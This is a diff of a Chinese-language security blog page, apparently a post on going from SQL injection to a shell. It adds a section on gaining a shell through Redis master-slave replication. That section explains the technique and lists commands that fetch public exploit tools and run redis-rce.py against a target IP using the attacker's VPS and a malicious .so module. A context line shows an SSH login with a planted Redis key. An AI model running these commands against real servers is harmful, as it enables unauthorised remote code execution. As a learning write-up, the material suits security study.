@@ -31,8 +31,9 @@
 <meta property="og:image" content="http://jager.top/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/2.png">
 <meta property="og:image" content="http://jager.top/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/3.png">
 <meta property="og:image" content="http://jager.top/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/4.png">
+<meta property="og:image" content="http://jager.top/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/5.png">
 <meta property="article:published_time" content="2020-09-18T13:01:44.000Z">
-<meta property="article:modified_time" content="2020-09-29T01:17:27.666Z">
+<meta property="article:modified_time" content="2020-09-29T02:53:31.367Z">
 <meta property="article:author" content="jager">
 <meta property="article:tag" content="总结, mysql">
 <meta name="twitter:card" content="summary">
@@ -290,7 +291,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">2k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2.3k</span>阅读时长: <span class="post-count reading-time">10 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -592,6 +593,32 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh&#96; &#96;-i redis.pub root@192.168.192.133</span><br></pre></td></tr></table></figure>
 
 <h4 id="redis主从复制漏洞获取shell"><a href="#redis主从复制漏洞获取shell" class="headerlink" title="redis主从复制漏洞获取shell"></a>redis主从复制漏洞获取shell</h4><p>在docker等容器中没有其他服务，无法通过计划任务，webshell等方式写文件获取shell</p>
+<p>这时利用redis的主从复制的特性可以反弹shell</p>
+<hr>
+<p><strong>什么是主从复制？</strong></p>
+<blockquote>
+<p>Master节点在平时提供服务，另外一个或多个Slave节点在平时不提供服务（或只提供数据读取服务）。当Master节点由于某些原因停止服务后，再人工/自动完成Slave节点到Master节点的切换工作，以便整个Redis集群继续向外提供服务</p>
+</blockquote>
+<hr>
+<p>主从复制步骤</p>
+<ol>
+<li>设置主节点的地址和端口</li>
+<li>建立套接字连接</li>
+<li>发送PING命令</li>
+<li>权限验证</li>
+<li>同步</li>
+<li>命令传播</li>
+</ol>
+<p><strong>为什么有漏洞?</strong></p>
+<p>简单的说就是，攻击机模拟redis的主节点</p>
+<blockquote>
+<p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上</p>
+</blockquote>
+<p>这样在攻击机上构建恶意so文件，就可以执行自己的命令了</p>
+<p>现成脚本和so文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;redis-rce.git   &#x2F;&#x2F;下载漏洞利用脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;redis-rogue-server &#x2F;&#x2F;so文件模块</span><br><span class="line">python redis-rce.py -r 目标IP -L 自己的vps  -f 加载的so模块 &#x2F;&#x2F;利用脚本</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/5.png" alt></p>
 
     </article>
     <!-- license  -->
